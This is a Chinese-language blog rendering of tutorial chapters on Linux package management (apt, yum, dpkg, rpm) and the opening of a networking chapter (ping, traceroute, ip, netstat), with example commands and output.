<p>确定发行版质量的最重要因素是<em>包装系统</em>以及发行版支持社区的活力。随着我们在Linux中花费更多的时间，我们会发现其软件景观极其动态。事物不断变化。大多数顶级Linux发行版每六个月发布新版本，许多单独的程序每天都有更新。为了跟上这场软件风暴，我们需要良好的<em>包管理</em>工具。</p>
<span id="more"></span>

<p>包管理是一种在系统上安装和维护软件的方法。如今，大多数人可以通过安装Linux发行商提供的<em>软件包</em>来满足他们的所有软件需求。这与Linux早期形成对比，当时人们必须下载并编译<em>源代码</em>来安装软件。编译源代码没有任何问题；事实上，能够访问源代码是Linux的伟大奇迹。它使我们（以及其他所有人）有能力检查并改进系统。只是拥有预编译的包处理起来更快更容易。</p>
<p>在本章中，我们将看看用于包管理的一些命令行工具。虽然所有主要的发行版都提供功能强大且复杂的图形程序来维护系统，但了解命令行程序也很重要。它们可以执行许多图形对应程序难以（或无法）完成的任务。</p>
<h3 id="包装系统"><a href="#包装系统" class="headerlink" title="包装系统"></a>包装系统</h3><p>不同的发行版使用不同的包装系统，一般来说，为一个发行版设计的包与另一个发行版不兼容。大多数发行版分为两大包装技术阵营：Debian .deb阵营和Red Hat .rpm阵营。有一些重要的例外，如Gentoo、Slackware和Arch，但大多数其他发行版使用这两个基本系统之一，如表14-1所示。</p>
<p><em>表14-1：主要包装系统家族</em></p>
<table>
<thead>
<tr>
<th><strong>包装系统</strong></th>
<th><strong>发行版（部分列表）</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian风格（.deb）</td>
<td>Debian, Ubuntu, Linux Mint, Raspbian</td>
</tr>
<tr>
<td>Red Hat风格（.rpm）</td>
<td>Fedora, CentOS, Red Hat Enterprise Linux, OpenSUSE</td>
</tr>
</tbody></table>
<h3 id="包装系统的工作方式"><a href="#包装系统的工作方式" class="headerlink" title="包装系统的工作方式"></a>包装系统的工作方式</h3><p>在专有软件行业中，软件发行的方式通常涉及购买一张如“安装盘”的安装媒介，或访问供应商的网站下载产品，然后运行“安装向导”来在系统上安装新应用程序。</p>
<p>Linux不是这样工作的。Linux系统的几乎所有软件都可以在互联网上找到。大部分软件由发行商以<em>软件包文件</em>的形式提供，其余的以源代码形式提供，可以手动安装。我们将在第23章，“编译程序”中讨论如何通过编译源代码来安装软件。</p>
<h4 id="软件包文件"><a href="#软件包文件" class="headerlink" title="软件包文件"></a>软件包文件</h4><p>包装系统中的软件基本单元是<em>软件包文件</em>。软件包文件是组成软件包的文件的压缩集合。一个包可能包含多个程序和支持这些程序的数据文件。除了要安装的文件外，软件包文件还包括有关该包的元数据，例如对包及其内容的文本描述。此外，许多包含有安装前和安装后执行配置任务的预安装和后安装脚本。</p>
<p>软件包文件由称为<em>软件包维护者</em>的人创建，通常（但不总是）是发行版供应商的雇员。软件包维护者从<em>上游提供商</em>（程序的作者）处获取源代码形式的软件，编译它，并创建软件包元数据和任何必要的安装脚本。通常，包维护者会对原始源代码进行修改，以改善程序与Linux发行版其他部分的集成。</p>
<h4 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h4><p>虽然一些软件项目选择自行打包和分发，但今天大多数软件包由发行商和感兴趣的第三方创建。软件包在中央仓库中提供给发行版的用户，这些仓库可能包含成千上万个专门为该发行版构建和维护的软件包。</p>
<p>一个发行版可能会维护几个不同的仓库，用于软件开发生命周期的不同阶段。例如，通常会有一个“测试”仓库，其中包含刚刚构建并打算由寻找漏洞的勇敢者在软件包普遍发布前使用的软件包。发行版通常还会有一个“开发”仓库，其中保存着即将纳入下一个主要版本发行的正在进行中的软件包。</p>
<p>发行版还可能有相关的第三方仓库。这些通常需要提供由于专利或DRM反规避问题等法律原因无法与发行版一起包含的软件。也许最著名的案例是在美国不合法的加密DVD支持。这些第三方仓库在软件专利和反规避法律不适用的国家运营。这些仓库通常完全独立于它们支持的发行版，要使用它们，必须了解它们并手动将它们包含在包管理系统的配置文件中。</p>
<h4 id="依赖性"><a href="#依赖性" class="headerlink" title="依赖性"></a>依赖性</h4><p>程序很少是“独立”的；相反，它们依赖于其他软件组件的存在来完成工作。例如，输入&#x2F;输出等常见活动由许多程序共享的例程处理。这些例程存储在所谓的<em>共享库</em>中，它为多个程序提供基本服务。如果一个包需要共享资源，如共享库，则称其具有<em>依赖性</em>。现代包管理系统都提供某种方法的<em>依赖性解析</em>，以确保安装包时，其所有依赖性也都被安装。</p>
<h4 id="高级和低级包工具"><a href="#高级和低级包工具" class="headerlink" title="高级和低级包工具"></a>高级和低级包工具</h4><p>包管理系统通常由两种类型的工具组成。</p>
<ul>
<li>低级工具处理诸如安装和移除软件包文件等任务。</li>
<li>高级工具执行元数据搜索和依赖性解析。</li>
</ul>
<p>在本章中，我们将查看Debian风格系统（如Ubuntu和许多其他系统）和Red Hat产品使用的工具。虽然所有Red Hat风格的发行版都依赖于相同的低级程序（rpm），但它们使用不同的高级工具。对于我们的讨论，我们将涵盖Red Hat企业版Linux和CentOS使用的高级程序yum。其他Red Hat风格的发行版提供具有可比</p>
<p>功能的高级工具（见表14-2）。</p>
<p><em>表14-2：包装系统工具</em></p>
<table>
<thead>
<tr>
<th><strong>发行版</strong></th>
<th><strong>低级工具</strong></th>
<th><strong>高级工具</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian风格</td>
<td>dpkg</td>
<td>apt, apt-get, aptitude</td>
</tr>
<tr>
<td>Fedora, Red Hat企业版Linux, CentOS</td>
<td>rpm</td>
<td>yum, dnf</td>
</tr>
</tbody></table>
<h3 id="常见包管理任务"><a href="#常见包管理任务" class="headerlink" title="常见包管理任务"></a>常见包管理任务</h3><p>许多操作可以使用命令行包管理工具执行。我们将查看最常见的操作。请注意，低级工具还支持创建软件包文件，这是本书范围之外的活动。</p>
<p>在下面的讨论中，<em>package_name</em>一词指的是软件包的实际名称，而不是<em>package_file</em>这个词，后者是包含软件包的文件的名称。</p>
<h4 id="在仓库中查找软件包"><a href="#在仓库中查找软件包" class="headerlink" title="在仓库中查找软件包"></a>在仓库中查找软件包</h4><p>使用高级工具搜索仓库元数据，可以根据其名称或描述定位软件包（见表14-3）。</p>
<p><em>表14-3：包搜索命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>apt-get update; apt-cache search <em>搜索字符串</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>yum search <em>搜索字符串</em></td>
</tr>
</tbody></table>
<p>例如，要在yum仓库中搜索emacs文本编辑器，我们可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum search emacs</span><br></pre></td></tr></table></figure>

<h4 id="从仓库安装包"><a href="#从仓库安装包" class="headerlink" title="从仓库安装包"></a>从仓库安装包</h4><p>高级工具允许从仓库下载包并安装，同时解决所有依赖关系（见表14-4）。</p>
<p><em>表14-4：包安装命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>apt-get update; apt-get install <em>包名</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>yum install <em>包名</em></td>
</tr>
</tbody></table>
<p>例如，要在Debian系统上从apt仓库安装emacs文本编辑器，我们可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update; apt-get install emacs</span><br></pre></td></tr></table></figure>

<h4 id="从包文件安装"><a href="#从包文件安装" class="headerlink" title="从包文件安装"></a>从包文件安装</h4><p>如果从非仓库来源下载了包文件，可以直接使用低级工具安装（但不解决依赖关系）（见表14-5）。</p>
<p><em>表14-5：低级包安装命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>dpkg -i <em>包文件</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>rpm -i <em>包文件</em></td>
</tr>
</tbody></table>
<p>例如，如果从非仓库站点下载了emacs-22.1-7.fc7-i386.rpm包文件，可以这样安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -i emacs-22.1-7.fc7-i386.rpm</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 由于这种技术使用低级rpm程序执行安装，因此不会进行依赖关系解析。如果rpm发现缺少依赖项，rpm将退出并显示错误。</p>
<h4 id="卸载包"><a href="#卸载包" class="headerlink" title="卸载包"></a>卸载包</h4><p>可以使用高级或低级工具卸载包。高级工具如表14-6所示。</p>
<p><em>表14-6：包卸载命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>apt-get remove <em>包名</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>yum erase <em>包名</em></td>
</tr>
</tbody></table>
<p>例如，要在Debian风格的系统上卸载emacs包，我们可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get remove emacs</span><br></pre></td></tr></table></figure>

<h4 id="从仓库更新包"><a href="#从仓库更新包" class="headerlink" title="从仓库更新包"></a>从仓库更新包</h4><p>最常见的包管理任务是保持系统与包的最新版本同步。高级工具可以一步完成这个重要任务（见表14-7）。</p>
<p><em>表14-7：包更新命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>apt-get update; apt-get upgrade</td>
</tr>
<tr>
<td>Red Hat</td>
<td>yum update</td>
</tr>
</tbody></table>
<p>例如，要在Debian风格的系统上应用所有可用的安装包更新，我们可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update; apt-get upgrade</span><br></pre></td></tr></table></figure>

<h4 id="从包文件升级包"><a href="#从包文件升级包" class="headerlink" title="从包文件升级包"></a>从包文件升级包</h4><p>如果从非仓库源下载了包的更新版本，可以安装此包以替换之前的版本（见表14-8）。</p>
<p><em>表14-8：低级包升级命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>dpkg -i <em>包文件</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>rpm -U <em>包文件</em></td>
</tr>
</tbody></table>
<p>例如，要在Red Hat系统上将现有的emacs安装更新为emacs-22.1-7.fc7-i386.rpm包文件中的版本，我们可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -U emacs-22.1-7.fc7-i386.rpm</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> dpkg没有像rpm那样用于升级包的特定选项。</p>
<h4 id="列出已安装的包"><a href="#列出已安装的包" class="headerlink" title="列出已安装的包"></a>列出已安装的包</h4><p>表14-9列出了我们可以用来显示系统上所有已安装包的命令。</p>
<p><em>表14-9：包列表命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>dpkg -l</td>
</tr>
<tr>
<td>Red Hat</td>
<td>rpm -qa</td>
</tr>
</tbody></table>
<h4 id="确定包是否安装"><a href="#确定包是否安装" class="headerlink" title="确定包是否安装"></a>确定包是否安装</h4><p>表14-10列出了我们可以用来显示指定包是否安装的低级工具。</p>
<p><em>表14-10：包状态命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>dpkg -s <em>包名</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>rpm -q <em>包名</em></td>
</tr>
</tbody></table>
<p>例如，要确定Debian风格的系统上是否安装了emacs包，我们可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --status emacs</span><br></pre></td></tr></table></figure>

<h4 id="显示已安装包的信息"><a href="#显示已安装包的信息" class="headerlink" title="显示已安装包的信息"></a>显示已安装包的信息</h4><p>如果知道已安装包的名称，我们可以使用表14-11中的命令来显示包的描述。</p>
<p><em>表14-11：包信息命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>apt-cache show <em>包名</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>yum info <em>包名</em></td>
</tr>
</tbody></table>
<p>例如，要在Debian风格的系统上查看emacs包的描述，我们可以使用这个命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-cache show emacs</span><br></pre></td></tr></table></figure>

<h4 id="查找哪个包安装了文件"><a href="#查找哪个包安装了文件" class="headerlink" title="查找哪个包安装了文件"></a>查找哪个包安装了文件</h4><p>要确定哪个包负责安装特定文件，我们可以使用表14-12中的命令。</p>
<p><em>表14-12：包文件识别命令</em></p>
<table>
<thead>
<tr>
<th><strong>风格</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Debian</td>
<td>dpkg -S <em>文件名</em></td>
</tr>
<tr>
<td>Red Hat</td>
<td>rpm -qf <em>文件名</em></td>
</tr>
</tbody></table>
<p>例如，要查看在Red Hat系统上安装了&#x2F;usr&#x2F;bin&#x2F;vim文件的包，我们可以使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -qf /usr/bin/vim</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在接下来的章节中，我们将探索许多不同的程序，涵盖广泛的应用领域。虽然这些程序中的大多数通常默认安装，但如果系统上尚未安装必要的程序，我们可能需要安装额外的包。有了对包管理的新认识（和赞赏），我们应该能够轻松地安装和管理所需的程序。</p>
<h3 id="Linux软件安装的神话"><a href="#Linux软件安装的神话" class="headerlink" title="Linux软件安装的神话"></a>Linux软件安装的神话</h3><p>从其他平台迁移过来的人有时会误以为在Linux下安装软件有些困难，认为不同发行版使用的各种打包方案是一个障碍。实际上，这确实是一个障碍，但只对想要分发仅限二进制版本的秘密软件的专有软件供应商来说。</p>
<p>Linux软件生态系统基于开源代码的理念。如果程序开发者发布了一个程序的源代码，那么与某个发行版相关的人很可能会打包该程序并将其包含在他们的仓库中。这种方法确保了程序与发行版的良好集成，并为用户提供了“一站式购物”的便利，而不是不得不搜索每个程序的网站。最近，一些主要的专有平台供应商已经开始构建模仿这一理念的应用商店。</p>
<p>设备驱动程序的处理方式大致相同，只不过不是作为发行版仓库中的单独项目，而是成为Linux内核的一部分。一般来说，Linux中没有所谓的“驱动程序磁盘”。要么内核支持某个设备，要么不支持，而Linux内核支持的设备比Windows多得多。当然，如果你需要的特定设备不受支持，这并没有什么安慰。发生这种情况时，你需要查看原因。驱动程序缺乏支持通常是由以下三个原因之一造成的：</p>
<p><strong>1.</strong>   <strong>设备太新。</strong> 由于许多硬件供应商不积极支持Linux开发，因此编写内核驱动程序代码的任务落在了Linux社区的成员身上。这需要时间。</p>
<p><strong>2.</strong>   <strong>设备太特殊。</strong> 并非所有发行版都包含所有可能的设备驱动程序。每个发行版都构建了自己的内核，由于内核非常可配置（这使得Linux能够运行在从手表到大型机的一切设备上），他们可能忽略了某个特定设备。通过定位并下载驱动程序的源代码，你（是的，你）可以自己编译并安装驱动程序。这个过程并不特别困难，但相当复杂。我们将在后面的章节中讨论编译软件。</p>
<p><strong>3.</strong>   <strong>硬件供应商在隐藏某些东西。</strong> 它既没有发布Linux驱动程序的源代码，也没有发布技术文档供他人为它们创建一个。这意味着硬件供应商试图保密设备的编程接口。由于我们不希望在计算机中使用秘密设备，最好避免使用此类产品。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><p>花些时间了解一下你所使用的发行版的包管理系统。每个发行版都为其包管理工具提供了文档。此外，这里还有一些更通用的资源：</p>
<ul>
<li>Debian GNU&#x2F;Linux FAQ的包管理章节提供了Debian系统上包管理的概述：<span class="exturl" data-url="aHR0cDovL3d3dy5kZWJpYW4ub3JnL2RvYy9GQVEvY2gtcGtndG9vbHMuZW4uaHRtbA==">http://www.debian.org/doc/FAQ/ch-pkgtools.en.html<i class="fa fa-external-link-alt"></i></span></li>
<li>RPM项目的主页：<span class="exturl" data-url="aHR0cDovL3d3dy5ycG0ub3JnLw==">http://www.rpm.org<i class="fa fa-external-link-alt"></i></span></li>
<li>YUM项目的主页：<span class="exturl" data-url="aHR0cDovL3l1bS5iYXNldXJsLm9yZy8=">http://yum.baseurl.org<i class="fa fa-external-link-alt"></i></span></li>
<li>关于元数据的背景知识，Wikipedia上有一篇文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9NZXRhZGF0YQ==">http://en.wikipedia.org/wiki/Metadata<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>网络</title>
    <url>/2024/04/16-networking/</url>
    <content><![CDATA[<h3 id="16-–-网络"><a href="#16-–-网络" class="headerlink" title="16 – 网络"></a>16 – 网络</h3><p>在网络领域，几乎没有什么是 Linux 无法完成的。Linux 被用来构建各种网络系统和设备，包括防火墙、路由器、域名服务器、网络附加存储（NAS）盒等等。</p>
<p>就像网络主题本身广泛一样，用于配置和控制网络的命令也非常多。我们将重点关注一些最常用的命令。选中的命令包括用于监控网络和传输文件的命令。此外，我们还将探讨用于进行远程登录的 ssh 程序。本章将涵盖以下命令：</p>
<span id="more"></span>

<ul>
<li>ping – 向网络主机发送 ICMP ECHO_REQUEST</li>
<li>traceroute – 打印数据包到网络主机的路由跟踪</li>
<li>ip – 显示&#x2F;操作路由、设备、策略路由和隧道</li>
<li>netstat – 打印网络连接、路由表、接口统计、伪装连接和多播成员</li>
<li>ftp – 互联网文件传输程序</li>
<li>wget – 非交互式网络下载器</li>
<li>ssh – OpenSSH SSH 客户端（远程登录程序）</li>
</ul>
<p>我们假设有一些网络方面的背景知识。在这个互联网时代，每个使用计算机的人都需要基本的网络概念理解。为了充分利用本章内容，我们应该熟悉以下术语：</p>
<ul>
<li>互联网协议（IP）地址</li>
<li>主机和域名</li>
<li>统一资源标识符（URI）</li>
</ul>
<p>有关这些术语的更多信息，请参阅下面的“进一步阅读”部分。</p>
<p><strong>注意：</strong> 我们将讨论的一些命令可能（取决于您的发行版）需要从发行版的存储库中安装额外的包，并且一些可能需要超级用户权限才能执行。</p>
<h4 id="检查和监控网络"><a href="#检查和监控网络" class="headerlink" title="检查和监控网络"></a>检查和监控网络</h4><p>即使您不是系统管理员，检查网络的性能和操作也经常是有帮助的。</p>
<h5 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h5><p>最基本的网络命令是 ping。ping 命令向指定主机发送一个特殊的网络数据包，称为 ICMP ECHO_REQUEST。大多数接收此数据包的网络设备将对其进行回复，从而验证网络连接。</p>
<p><strong>注意：</strong> 大多数网络设备（包括 Linux 主机）都可以配置为忽略这些数据包。出于安全原因，通常会这样做，以便部分隐藏主机免受潜在攻击者的侵扰。防火墙配置为阻止 ICMP 流量也很常见。</p>
<p>例如，要查看我们是否可以访问 linuxcommand.org（我们最喜欢的网站之一 ;-），我们可以这样使用 ping：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ping linuxcommand.org</span><br></pre></td></tr></table></figure>

<p>一旦启动，ping 会继续以指定的间隔（默认是一秒）发送数据包，直到被中断。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ping linuxcommand.org</span><br><span class="line">PING linuxcommand.org (66.35.250.210) 56(84) bytes of data.</span><br><span class="line">64 bytes from vhost.sourceforge.net (66.35.250.210): icmp_seq=1</span><br><span class="line">ttl=43 time=107 ms</span><br><span class="line">64 bytes from vhost.sourceforge.net (66.35.250.210): icmp_seq=2</span><br><span class="line">ttl=43 time=108 ms</span><br><span class="line">64 bytes from vhost.sourceforge.net (66.35.250.210): icmp_seq=3</span><br><span class="line">ttl=43 time=106 ms</span><br><span class="line">64 bytes from vhost.sourceforge.net (66.35.250.210): icmp_seq=4</span><br><span class="line">ttl=43 time=106 ms </span><br><span class="line">64 bytes from vhost.sourceforge.net (66.35.250.210): icmp_seq=5</span><br><span class="line">ttl=43 time=105 ms</span><br><span class="line">64 bytes from vhost.sourceforge.net (66.35.250.210): icmp_seq=6</span><br><span class="line">ttl=43 time=107 ms</span><br><span class="line">--- linuxcommand.org ping statistics ---</span><br><span class="line">6 packets transmitted, 6 received, 0% packet loss, time 6010ms</span><br><span class="line">rtt min/avg/max/mdev = 105.647/107.052/108.118/0.824 ms</span><br></pre></td></tr></table></figure>

<p>在中断后（在本例中在第六个数据包后），通过按 Ctrl-c，ping 打印性能统计数据。正常运行的网络应显示 0% 的数据包丢失。成功的 “ping” 表明网络的各个元素（其接口卡、电缆、路由和网关）通常处于良好的工作状态。</p>
<h5 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h5><p>traceroute 程序（一些系统使用类似的 tracepath 程序）列出网络流量从本地系统到指定主机所经过的所有“跳数”。例如，要查看到达 slashdot.org 的路线，我们会这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ traceroute slashdot.org</span><br></pre></td></tr></table></figure>

<p>输出看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">traceroute to slashdot.org (216.34.181.45), 30 hops max, 40 byte</span><br><span class="line">packets</span><br><span class="line"> 1 ipcop.localdomain (192.168.1.1) 1.066 ms 1.366 ms 1.720 ms</span><br><span class="line"> 2 * * *</span><br><span class="line"> 3 ge-4-13-ur01.rockville.md.bad.comcast.net (68.87.130.9) 14.622</span><br><span class="line">ms 14.885 ms 15.169 ms</span><br><span class="line"> 4 po-30-ur02.rockville.md.bad.comcast.net (68.87.129.154) 17.634</span><br><span class="line">ms 17.626 ms 17.899 ms</span><br><span class="line"> 5 po-60-ur03.rockville.md.bad.comcast.net (68.87.129.158) 15.992</span><br><span class="line">ms 15.983 ms 16.256 ms</span><br><span class="line"> 6 po-30-ar01.howardcounty.md.bad.comcast.net (68.87.136.5) 22.835</span><br><span class="line">ms 14.233 ms 14.405 ms</span><br><span class="line"> 7 po-10-ar02.whitemarsh.md.bad.comcast.net (68.87.129.34) 16.154</span><br><span class="line">ms 13.600 ms 18.867 ms</span><br><span class="line"> 8 te-0-3-0-1-cr01.philadelphia.pa.ibone.comcast.net (68.86.90.77)</span><br><span class="line">21.951 ms 21.073 ms 21.557 ms </span><br><span class="line"> 9 pos-0-8-0-0-cr01.newyork.ny.ibone.comcast.net (68.86.85.10)</span><br><span class="line">22.917 ms 21.884 ms 22.126 ms</span><br><span class="line"> 10 204.70.144.1 (204.70.144.1) 43.110 ms 21.248 ms 21.264 ms</span><br><span class="line"> 11 cr1-pos-0-7-3-1.newyork.savvis.net (204.70.195.93) 21.857 ms</span><br><span class="line">cr2-pos-0-0-3-1.newyork.savvis.net (204.70.204.238) 19.556 ms cr1-</span><br><span class="line">pos-0-7-3-1.newyork.savvis.net (204.70.195.93) 19.634 ms</span><br><span class="line"> 12 cr2-pos-0-7-3-0.chicago.savvis.net (204.70.192.109) 41.586 ms</span><br><span class="line">42.843 ms cr2-tengig-0-0-2-0.chicago.savvis.net (204.70.196.242)</span><br><span class="line">43.115 ms</span><br><span class="line"> 13 hr2-tengigabitethernet-12-1.elkgrovech3.savvis.net</span><br><span class="line">(204.70.195.122) 44.215 ms 41.833 ms 45.658 ms</span><br><span class="line"> 14 csr1-ve241.elkgrovech3.savvis.net (216.64.194.42) 46.840 ms</span><br><span class="line">43.372 ms 47.041 ms</span><br><span class="line"> 15 64.27.160.194 (64.27.160.194) 56.137 ms 55.887 ms 52.810 ms</span><br><span class="line"> 16 slashdot.org (216.34.181.45) 42.727 ms 42.016 ms 41.437 ms</span><br></pre></td></tr></table></figure>

<p>在输出中，我们可以看到从测试系统连接到 slashdot.org 需要经过 16 个路由器。对于提供识别信息的路</p>
<p>在上面的输出中，我们可以看到，从测试系统到 slashdot.org 的连接需要经过 16 个路由器。对于提供识别信息的路由器，我们看到它们的主机名、IP 地址和性能数据，其中包括从本地系统到路由器的三次往返时间样本。对于未提供识别信息的路由器（由于路由器配置、网络拥堵、防火墙等原因），我们看到如第 2 跳的行中所示的星号。在路由信息被阻止的情况下，我们有时可以通过添加 -T 或 -I 选项到 traceroute 命令来克服这一点。</p>
<h5 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h5><p>ip 程序是一个多功能网络配置工具，利用了现代 Linux 内核中的全面网络功能。它取代了早期的、现在已弃用的 ifconfig 程序。使用 ip，我们可以检查系统的网络接口和路由表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN</span><br><span class="line"> group default</span><br><span class="line"> <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line"> inet 127.0.0.1/8 scope host lo</span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 ::1/128 scope host</span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast </span><br><span class="line">state UP group default qlen 1000</span><br><span class="line"> <span class="built_in">link</span>/ether ac:22:0b:52:cf:84 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"> inet 192.168.1.14/24 brd 192.168.1.255 scope global eth0</span><br><span class="line"> valid_lft forever preferred_lft forever</span><br><span class="line"> inet6 fe80::ae22:bff:fe52:cf84/64 scope <span class="built_in">link</span></span><br><span class="line"> valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>在上面的示例中，我们看到测试系统有两个网络接口。第一个称为 lo，是 <em>环回接口</em>，是系统用于“自言自语”的虚拟接口；第二个称为 eth0，是以太网接口。</p>
<p>在进行常规网络诊断时，重要的是要查看每个接口的第一行中是否出现 UP 单词，表示网络接口已启用，并且在第三行的 inet 字段中是否有有效的 IP 地址。对于使用动态主机配置协议（DHCP）的系统，此字段中的有效 IP 地址将验证 DHCP 是否正常工作。</p>
<h4 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h4><p>netstat 程序用于检查各种网络设置和统计信息。通过使用其许多选项，我们可以查看网络设置中的各种功能。使用 -ie 选项，我们可以检查系统中的网络接口。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ netstat -ie</span><br><span class="line">eth0 Link encap:Ethernet HWaddr 00:1d:09:9b:99:67</span><br><span class="line"> inet addr:192.168.1.2 Bcast:192.168.1.255 Mask:255.255.255.0</span><br><span class="line"> inet6 addr: fe80::21d:9ff:fe9b:9967/64 Scope:Link</span><br><span class="line"> UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1</span><br><span class="line"> RX packets:238488 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line"> TX packets:403217 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line"> collisions:0 txqueuelen:100</span><br><span class="line"> RX bytes:153098921 (146.0 MB) TX bytes:261035246 (248.9 MB)</span><br><span class="line"> Memory:fdfc0000-fdfe0000</span><br><span class="line">lo Link encap:Local Loopback</span><br><span class="line"> inet addr:127.0.0.1 Mask:255.0.0.0</span><br><span class="line"> inet6 addr: ::1/128 Scope:Host</span><br><span class="line"> UP LOOPBACK RUNNING MTU:16436 Metric:1</span><br><span class="line"> RX packets:2208 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line"> TX packets:2208 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line"> collisions:0 txqueuelen:0</span><br><span class="line"> RX bytes:111490 (108.8 KB) TX bytes:111490 (108.8 KB)</span><br></pre></td></tr></table></figure>

<p>使用 -r 选项将显示内核的网络路由表。这显示了网络配置为如何发送数据包从一个网络到另一个网络。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ netstat -r</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination Gateway Genmask Flags MSS Window irtt Iface</span><br><span class="line">192.168.1.0 * 255.255.255.0 U 0 0 0 eth0</span><br><span class="line">default 192.168.1</span><br><span class="line"></span><br><span class="line">1.0.0.0 UG 0 0 0 eth0</span><br></pre></td></tr></table></figure>

<p>在这个简单的示例中，我们看到一个典型的局域网（LAN）客户机的路由表，该局域网位于防火墙&#x2F;路由器后面。列表的第一行显示目的地为 192.168.1.0。以零结尾的 IP 地址指的是网络，而不是单个主机，因此这个目的地意味着 LAN 上的任何主机。下一个字段是网关，即从当前主机到目的网络的网关（路由器）的名称或 IP 地址。此字段中的星号表示不需要网关。</p>
<p>最后一行包含目的地 default。这意味着任何目的地网络不在表中列出的流量。在我们的示例中，我们看到网关被定义为具有 192.168.1.1 地址的路由器，这个路由器应该知道如何处理目的地流量。</p>
<p>就像 ip 一样，netstat 程序有许多选项，我们只看了几个。查看 ip 和 netstat 手册页以获取完整列表。</p>
<h3 id="网络上的文件传输"><a href="#网络上的文件传输" class="headerlink" title="网络上的文件传输"></a>网络上的文件传输</h3><p>除非我们可以在网络上移动文件，否则网络有什么用呢？有许多程序可以在网络上移动数据。我们现在将介绍其中的两个，并在稍后的章节中介绍更多。</p>
